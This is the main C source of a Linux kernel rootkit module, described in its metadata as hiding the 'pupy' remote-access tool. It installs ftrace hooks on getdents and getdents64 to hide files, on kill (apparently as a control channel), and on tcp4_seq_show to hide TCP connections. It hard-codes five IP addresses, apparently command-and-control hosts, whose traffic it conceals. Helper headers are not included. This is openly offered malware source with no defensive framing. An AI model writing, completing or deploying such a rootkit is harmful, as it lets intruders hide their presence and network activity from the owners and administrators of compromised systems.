#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>

#include "ftrace_helper.h"
#include "hidefile.h"
#include "hide_tcp_connection.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("DL");
MODULE_DESCRIPTION("Hiding pupy rkt");
MODULE_VERSION("0.01");

static struct ftrace_hook hooks[] = {
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hook_getdents, &orig_getdents),
    HOOK("sys_kill", hook_kill, &orig_kill),
};

static struct ftrace_hook hooks2[] = {
    HOOK2("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    int err;

    // 初始化黑名单 IP
    blacklist_ips[0] = in_aton("172.104.181.84"); 
    blacklist_ips[1] = in_aton("172.104.60.29");   
    blacklist_ips[2] = in_aton("103.3.62.5");
    blacklist_ips[3] = in_aton("172.104.57.250");
    blacklist_ips[4] = in_aton("143.42.74.25");





    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    err = fh_install_hooks(hooks2, ARRAY_SIZE(hooks2));
    if(err)
        return err;

    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    fh_remove_hooks(hooks2, ARRAY_SIZE(hooks2));
}

module_init(rootkit_init);
module_exit(rootkit_exit);